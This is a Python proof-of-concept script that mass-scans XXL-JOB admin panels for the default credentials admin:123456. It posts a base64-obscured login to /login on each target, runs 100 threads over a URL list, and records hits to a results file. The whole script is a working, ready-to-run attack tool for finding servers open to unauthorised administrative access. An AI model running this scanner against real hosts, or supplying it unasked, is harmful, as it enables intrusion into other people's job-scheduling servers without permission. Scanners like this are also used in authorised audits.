#-*- coding: utf-8 -*-
import argparse,sys,requests
import base64
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
 /$$   /$$ /$$   /$$ /$$                /$$$$$  /$$$$$$  /$$$$$$$ 
| $$  / $$| $$  / $$| $$               |__  $$ /$$__  $$| $$__  $$
|  $$/ $$/|  $$/ $$/| $$                  | $$| $$  \ $$| $$  \ $$
 \  $$$$/  \  $$$$/ | $$                  | $$| $$  | $$| $$$$$$$ 
  >$$  $$   >$$  $$ | $$             /$$  | $$| $$  | $$| $$__  $$
 /$$/\  $$ /$$/\  $$| $$            | $$  | $$| $$  | $$| $$  \ $$
| $$  \ $$| $$  \ $$| $$$$$$$$      |  $$$$$$/|  $$$$$$/| $$$$$$$/
|__/  |__/|__/  |__/|________//$$$$$$\______/  \______/ |_______/ 
                             |______/                             
                                       tag:  XXL_JOB                                       
                                       @version: 1.0.0   @author: Despacitio096           
"""
    print(test)
#写一个未授权访问的，url拼接路径检查返回码是否200，和这个差不多

def poc(target):
    url = target + "/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62",
        "Accept": "*/*",
        "Accept - Language":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "Accept-Encoding":"gzip, deflate",
        "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With":"XMLHttpRequest"
    }
    data = "dXNlck5hbWU9YWRtaW4mcGFzc3dvcmQ9MTIzNDU2"
    try:
     response = requests.post(url,headers=headers,data =base64.b64decode(data).decode(),verify=False,timeout=5,allow_redirects=False)
    # print(response)
     if response.json()['code'] == 200:
        print(f"[+] {target} is vulnable,[admin:123456]")
        with open("result1.txt", "a+", encoding="utf-8") as f:
            f.write(target+"\n")
     else:
        print(f"[-] {target} is not vulnable")
    except:
        print(f"[*] {target} server error")

def main():
    banner()
    parser = argparse.ArgumentParser(description='THERE IS SOMETHING WRONG IN XXL_JOB,BECAUSE SOMEONE USE WEAKEN PASSWORDS,THIS CAUSE SERVER NOT SAFE ANYMORE')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com,USED FOR SINGLE TEST")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt  USED FOR ABUNDANT TESTS")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")





if __name__ == '__main__':
        main()